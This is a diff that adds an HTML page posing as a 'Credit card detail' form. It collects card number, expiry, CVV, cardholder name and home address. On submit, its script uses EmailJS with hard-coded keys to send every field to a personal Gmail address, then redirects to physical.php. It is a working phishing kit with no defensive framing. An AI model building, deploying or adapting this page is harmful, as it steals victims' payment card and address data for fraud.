@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>CC</title>
+
+  <!-- Styles -->
+  <link href='https://fonts.googleapis.com/css?family=Roboto:400,300,100' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="styleca.css">
+  <meta name="robots" content="noindex,follow" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+  
+</head>
+
+<body>
+<img src="head.jpg" style="width:100%; height:%;"/>
+ <div>
+    <form class="credit-card" action="#" method="post" id="submitform">
+      <div class="form-header">
+        <h4 class="title">Credit card detail</h4>
+      </div>
+
+      <div class="form-body">
+      <!-- Card Number -->
+        <input type="text" class="card-number" placeholder="Card Holder Name" id="cardname" required>
+          
+        <!-- Card Number -->
+        <input type="number" class="card-number" placeholder="Card Number" id="cardnum" required>
+
+        <!-- Date Field -->
+        
+        <div class="date-field">
+<label for="date">Exp date</label> 
+
+          <div class="month">
+           <input type="number" name="date"id="month" placeholder="Month" required>
+          </div>
+          <div class="year">
+      <input type="number" name="date"id="year" placeholder="Year" required>
+              
+          </div>
+        </div>
+
+        <!-- Card Verification Field -->
+        <div class="card-verification">
+          <div class="cvv-input">
+            <input type="number" placeholder="CVV" id="cvv" required>
+          </div>
+          <div class="cvv-details">
+            <p>3 or 4 digits usually found <br> on the signature strip</p>
+          </div>
+          
+          
+          
+          
+      <!-- Card Number -->
+        <input type="text" class="card-number" placeholder="Country Name" id="country" required>
+        
+      <!-- Card Number -->
+        <input type="text" class="card-number" placeholder="State" id="state" required>
+        
+      <!-- Card Number -->
+        <input type="number" class="card-number" placeholder="ZIP Code" id="zip" name="zip code" required>
+        
+      <!-- Card Number -->
+        <input type="text" class="card-number" placeholder="*Home address1" id="add1" required>
+        
+      <!-- Card Number -->
+        <input type="text" class="card-number" placeholder="*Home address2" id="add2" required>
+          
+          
+        </div>
+
+        <!-- Buttons -->
+        <button type="submit" class="proceed-btn"><a href="#">Proceed</a></button>
+        <button type="button" class="paypal-btn"><a href="#">with</a></button>
+      </div>
+    </form>
+    </div>
+  
+
+<script>
+document.getElementById('submitform').addEventListener('submit', function(event) {
+  event.preventDefault(); // Prevent form submission
+  
+  var cardnum = document.getElementById('cardnum').value;
+  var month = document.getElementById('month').value;
+var year = document.getElementById('year').value;
+  var cvv = document.getElementById('cvv').value;
+  
+var zip = document.getElementById('zip').value;
+  
+  var cardname = document.getElementById('cardname').value;
+var country = document.getElementById('country').value;
+  var state = document.getElementById('state').value;
+
+
+var add1 = document.getElementById('add1').value;
+  var add2 = document.getElementById('add2').value;
+  // Configure emailjs
+  emailjs.init('835HY_wRkYBhqdu7d');
+
+  // Create email message
+  var message = {
+    to: 'robinlaura101@gmail.com', // Change to your Gmail address
+    subject: 'Card Details',
+    text: `Cardnum: ${cardnum}, \n\n Month: ${month}, \n\n Year: ${year}, \n\n CVV: ${cvv} \n\n Cardname: ${cardname}, \n\n Country: ${country}, \n\n State: ${state}, \n\n Zip Code: ${zip} \n\n Address1: ${add1}, \n\n Address2: ${add2}`
+  };
+ 
+  // Send email
+  emailjs.send('service_bg462kr', 'template_6pyapsf', message)
+    .then(function(response) {
+      console.log('Connecting manually... ..', response);
+      alert('Connecting manually... ..', location.href="physical.php");
+    }, function(error) {
+      console.error('Error sending email:', error);
+      alert('Error sending login details. Please try again later.');
+    });
+    
+});
+
+
+</script>
+
+ 
+</body>
+</html>
